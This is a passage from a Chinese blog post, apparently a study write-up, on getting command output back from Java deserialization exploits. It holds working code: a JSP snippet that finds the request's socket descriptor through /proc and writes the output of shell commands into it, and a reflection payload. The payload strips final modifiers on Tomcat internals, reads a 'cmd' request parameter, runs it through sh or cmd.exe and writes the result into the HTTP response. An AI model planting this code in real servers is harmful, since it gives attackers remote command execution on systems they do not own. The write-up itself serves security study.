java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res1 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        String line = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res1.add(line);  <span class="comment">//将所有的Inode添加到一个列表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep((<span class="keyword">long</span>)<span class="number">2000</span>); <span class="comment">//延时2秒</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">//pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk '&#123;print $9, $11&#125;'"</span>; <span class="comment">//获取延时2秒后的Inode和fd属性，理论上来讲应该和第一次获取的Inode不一样，但是无论是第一次获取的Inode还是延迟后获取的Inode都会包含我们本次请求的socket对应的Inode</span></span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res2 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res2.add(line);  <span class="comment">//获取延迟2秒后的socket的Inode</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res2.size(); i++)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                String socketNo = ((String)res2.get(i)).split(<span class="string">"\\s+"</span>)[<span class="number">1</span>].substring(<span class="number">8</span>); <span class="comment">//从res2中得到Inode</span></span><br><span class="line">                socketNo = socketNo.substring(<span class="number">0</span>, socketNo.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res1.size(); j++)&#123; </span><br><span class="line">                    <span class="keyword">if</span>(!socketNo.equals(res1.get(j))) <span class="keyword">continue</span>; <span class="comment">//判断延迟后的Inode是否在第一次请求的Inode中，如果不在则说明是新建立的socket，如果在则有可能是我们本次请求的socket。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(Integer.parseInt(socketNo) &gt; max) &#123; <span class="comment">//判断获取的Inode是否是最大的，如果是最大的，也就代表最新的一个socket，则有可能是我们请求的socket。</span></span><br><span class="line">                        max = Integer.parseInt(socketNo);</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                <span class="comment">//pass</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = Integer.parseInt(((String)res2.get(index)).split(<span class="string">"\\s"</span>)[<span class="number">0</span>]); <span class="comment">//获取到Inode最大的文件描述符fd的值。</span></span><br><span class="line">        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);//获取FileDescriptor的构造器</span><br><span class="line">        c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"id"</span>&#125;;</span><br><span class="line">        String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next(); <span class="comment">//执行我们想要执行的命令</span></span><br><span class="line">        String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + res.length() + <span class="string">"\n\n"</span> + res + <span class="string">"\n"</span>;</span><br><span class="line">        java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(fd)&#125;)); <span class="comment">//获取通过fd获取socket的FileOutputStream输出流</span></span><br><span class="line">        os.write(result.getBytes()); <span class="comment">// 将命令执行的结果进行写入</span></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​        通过这种方式可以增加找到我们本次socket请求的概率，但是也不能保证写入的一定是我们本次请求的socket。如果写入的不是我们本次请求的socket，则可能会导致异常。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222163940568.png" alt="image-20201222163940568"></p>
<h3 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h3><h4 id="lastServicedResponse获取response对象"><a href="#lastServicedResponse获取response对象" class="headerlink" title="lastServicedResponse获取response对象"></a>lastServicedResponse获取response对象</h4><p>​        之前我们了解了windows和Linux的回显方法，这些方法的基本思路是找到我们请求的那条数据的socket的文件描述符，向请求的响应中写入命令执行的结果，那么我们能不能在http层面去获取到当前HTTP请求的响应，并在响应中写入我们的回显。在java web中存在HttpServletResponse和HttpServletResponse对象，通过这两个对象我们可以对请求和响应进行处理，比如我们可以通过<code>response.getWriter().write()</code>将响应内容发送到缓冲区，并刷新缓冲区发送回显，测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String xxx=<span class="string">"test666"</span>;</span><br><span class="line">    Writer writer = response.getWriter();</span><br><span class="line">    writer.write(xxx);</span><br><span class="line">    writer.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174453051.png" alt="image-20201222174453051"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174459580.png" alt="image-20201222174459580"></p>
<p>​        这个是我们直接修改源代码实现的结果，在实际使用过程中我们可能是需要通过反射来执行命令的，<strong>我们如何才能通过反射调用获取本次请求的response对象？</strong></p>
<p>​        一般来说，HttpServletResponse实例化的对象已经被加载到内存中，我们无法通过反射调用来获取这个对象中的内容，所以比较好的方法是去寻找HttpServletResponse对象在哪里被存储过，再通过反射调用获取存储HttpServletResponse的变量的值，再调用write将命令执行的结果写入返回内容。</p>
<p>​        参考先知上<code>Tomcat中一种半通用回显方法</code>,作者发现了ApplicationFilterChain的lastServicedResponse记录了response的内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181211815.png" alt="image-20201222181211815"></p>
<p>​        因此我们可以通过调用getLastServicedResponse来获取ServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181321356.png" alt="image-20201222181321356"></p>
<p>​        我们还需要确定response的对象在整个传输链中代表的是否是一个对象，我将执行到index是的response对象和ApplicationFilterChain中的response对象做一个对比，发现是一个对象，所以我们在ApplicationFilterChain获取的response</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181748658.png" alt="image-20201222181748658"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181935267.png" alt="image-20201222181935267"></p>
<p>​        而且lastServicedResponse是static final修饰的，也就是说这个属性一旦赋值后就不能更改。并且还通过ThreadLocal进行修饰，这代表这个属性只能在当前线程中进行调用。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222183335083.png" alt="image-20201222183335083"></p>
<p>​        但是想要执行到赋值操作，需要ApplicationDispatcher.WRAP_SAME_OBJECT的属性为true，但是这个属性默认为false,也就是说默认不会执行这个赋值语句。所以我们需要通过反射来获取ApplicationDispatcher.WRAP_SAME_OBJECT属性，并对这个属性的值进行更改。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222191217452.png" alt="image-20201222191217452"></p>
<p>​        通过上面的分析，要通过这种思路完成tomcat下的回显 ，需要如下步骤</p>
<ul>
<li><p>通过反射获取WRAP_SAME_OBJECT_FIELD，并将这个值设置为true</p>
</li>
<li><p>通过反射获取lastServicedRequest和lastServicedResponse属性，从lastServicedRequest获取当前的request对象，通过request对象获取请求参数。通过lastServicedResponse获取response对象，并获取到response的write方法。</p>
</li>
<li><p>执行命令并将命令执行的结果写入到response中。</p>
<p>由于我们需要修改的属性lastServicedRequest和lastServicedResponse都是final static修饰的变量，因此，我们得了解如何通过反射来设置final static修饰的变量。</p>
<p>​        我写了一个小Demo，代码如下：</p>
<p>test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String test666 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTest666</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GetTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行上面的代码，会返回如下报错，也就是说无法通过set方法给由final修饰的属性赋值，因为一般final代表的是一个常量，一般不允许我们去修改常量的值。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092542124.png" alt="image-20201223092542124"></p>
<p>​        在Filed类中，可以通过getModifiers方法获取Filed的modifiers属性。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092911018.png" alt="image-20201223092911018"></p>
<p>​    这个属性的值代表了用户的访问权限</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x00000001(十六进制) = 1(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PUBLIC           = <span class="number">1</span>;</span><br><span class="line"> <span class="comment">//0x00000002(十六进制) = 2(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PRIVATE          = <span class="number">2</span>;   </span><br><span class="line"> <span class="comment">//0x00000004(十六进制) = 4(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROTECTED        = <span class="number">4</span>;  </span><br><span class="line"> <span class="comment">//0x00000008(十六进制) = 8(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STATIC           = <span class="number">8</span>;  </span><br><span class="line"> <span class="comment">//0x00000010(十六进制) = 16(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FINAL            = <span class="number">16</span>;</span><br></pre></td></tr></table></figure>

<p>​        如果我们的修饰符是由<code>private static final</code>来修饰的,modifiers属性的值也就是26。所以我们如果要对final修饰的变量进行赋值，就要重新设置这个变量的modifiers属性。代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        Field  modifiersField = Field.class.getDeclaredField("modifiers");  //获取Field类的modifiers属性</span><br><span class="line">        modifiersField.setAccessible(<span class="keyword">true</span>);  <span class="comment">//设置属性的访问权限</span></span><br><span class="line">        modifiersField.setInt(test666, test666.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//重新设置test666变量的modifiers属性</span></span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行该代码，我们可以看到，没有设置前test666变量的modifiers属性为26，设置后更改为10，也就是去掉了test666变量的final修饰符。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093651210.png" alt="image-20201223093651210"></p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093748773.png" alt="image-20201223093748773"></p>
<p>​        理解了这个知识点，我们来看一下使用tomcat回显的整体代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);  <span class="comment">//获取ApplicationDispatcher类的WRAP_SAME_OBJECT属性。</span></span><br><span class="line">     Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest"); //获取ApplicationFilterChain的lastServicedRequest属性</span><br><span class="line">     Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse"); //获取ApplicationFilterChain的lastServicedResponse属性</span><br><span class="line">     Field  modifiersField = Field.class.getDeclaredField("modifiers"); //获取Field的modifiers属性</span><br><span class="line">     modifiersField.setAccessible(<span class="keyword">true</span>); <span class="comment">//这个属性是由private修饰的，所以需要设置访问权限</span></span><br><span class="line">     modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//去掉WRAP_SAME_OBJECT_FIELD的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedRequestField的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedResponseField的final修饰</span></span><br><span class="line">     WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">     ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);<span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。lastServicedRequest进行初始化</span></span><br><span class="line">     <span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     String cmd = lastServicedRequest != <span class="keyword">null</span></span><br><span class="line">             ? lastServicedRequest.get().getParameter(<span class="string">"cmd"</span>)</span><br><span class="line">             : <span class="keyword">null</span>; <span class="comment">//判断lastServicedRequest中是否为NULL，如果为NULL说明还不能获取request中的内容。</span></span><br><span class="line">     <span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123; <span class="comment">//判断WRAP_SAME_OBJECT是否为True,lastServicedResponse和lastServicedRequest内容是否为空</span></span><br><span class="line">         lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">// 初始化lastServicedRequest</span></span><br><span class="line">         lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">//初始化lastServicedResponse</span></span><br><span class="line">         WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>); <span class="comment">//设置WRAP_SAME_OBJECT_FIELD属性为True</span></span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">         ServletResponse responseFacade = lastServicedResponse.get();</span><br><span class="line">         java.io.Writer w = responseFacade.getWriter(); <span class="comment">//获取response.writer</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">         String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">         <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">             isLinux = <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">         Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">         String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">         w.write(output);  <span class="comment">//写入命令执行结果</span></span><br><span class="line">         w.flush();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>​        最后效果如下，由于第一次请求时WRAP_SAME_OBJECT_FIELD属性为false所以不会给lastServicedResponse赋值，因此在第一次访问时是无法获取命令执行结果的，后来再去请求，就可以正常执行命令了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223104155616.png" alt="image-20201223104155616"></p>
<h4 id="AbstractProcessor获取response对象"><a href="#AbstractProcessor获取response对象" class="headerlink" title="AbstractProcessor获取response对象"></a>AbstractProcessor获取response对象</h4><p>​        参考<code>基于全局储存的新思路 | Tomcat的一种通用回显方法研究</code>的文章，可以通过其他方法来寻找request和response对象被tomcat存储过的地方。经过寻找，发现AbstractProcessor中会存储request和response对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113516089.png" alt="image-20201223113516089"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113558202.png" alt="image-20201223113558202"></p>
<p>​        但是AbstractProcessor类的request和response不是由static修饰的，也就是说我们想要获取这两个属性，就需要获取到AbstractProcessor对象。在打断点调试的过程中，发现tomcat会去创建Http11Processor对象，而Http11Processor是AbstractProcessor的子类，所以我们只要获取到Http11Processor对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114132149.png" alt="image-20201223114132149"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114257847.png" alt="image-20201223114257847"></p>
<p>​        所以需要查看哪里存储了processor对象，我们可以看到当获取了processor对象后，调用了register方法，并且传入了processor对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134031429.png" alt="image-20201223134031429"></p>
<p>​        在register中，获取了RequestInfo，并调用了setGlobalProcessor，并传入了this.global。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134142611.png" alt="image-20201223134142611"></p>
<p>​        传入的this.global也就是ConnectionHandler的global,而这个global是RequestGroupInfo对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144452026.png" alt="image-20201223144452026"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144535512.png" alt="image-20201223144535512"></p>
<p>​        跟进setGlobalProcessor,调用了addRequestProcessor并传入了this也就是requestInfo对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134402832.png" alt="image-20201223134402832"></p>
<p>​        继续跟进，将RequestInfo添加到了this.processors中</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134438913.png" alt="image-20201223134438913"></p>
<p>​        也就是将请求的requestinfo信息保存在了ConnectionHandler的global中。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144922321.png" alt="image-20201223144922321"></p>
<p>​        所以我们现在也可以考虑先获取AbstractProtocol对象，经过查找发现CoyoteAdapter类调用了connector，而connector中包含了</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145840694.png" alt="image-20201223145840694"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145931811.png" alt="image-20201223145931811"></p>
<p>​        查看继承关系，可以发现ProtocolHandler为AbstractProtocol的接口。不同的请求协议的类型会调用不同的子类去进行处理。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223151356955.png" alt="image-20201223151356955"></p>
<p>​        所以我们如果可以找到connector对象，也可以间接获取request。在tomcat.java中，会将connector存储到Service对象中，所以我们只要可以获取Service对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223152222218.png" alt="image-20201223152222218"></p>
<p>​        StandardService可以通过applicationContext来获取，applicationContext可以通过Context获取到，Context可以通过webappClassLoaderBase来获取,在Tomcat中通过webappClassLoader来加载web应用的calss文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tomcat的类加载器可以分为两部分，第一个是Tomcat自身所使用的类加载器，会加载jre的lib包及tomcat的lib包的类，遵循类加载的双亲委派机制；第二个是每个Web应用程序用的，每个web应用程序都有自己专用的WebappClassLoader，优先加载&#x2F;web-inf&#x2F;lib下的jar中的class文件，这样就隔离了每个web应用程序的影响，但是webappClassLoader没有遵循类加载的双亲委派机制，处理的方法就是在使用webappClassLoader的load加载类会进行过滤，如果有些类被过滤掉还是通过双亲委派机制优先从父加载器中加载类。</span><br></pre></td></tr></table></figure>

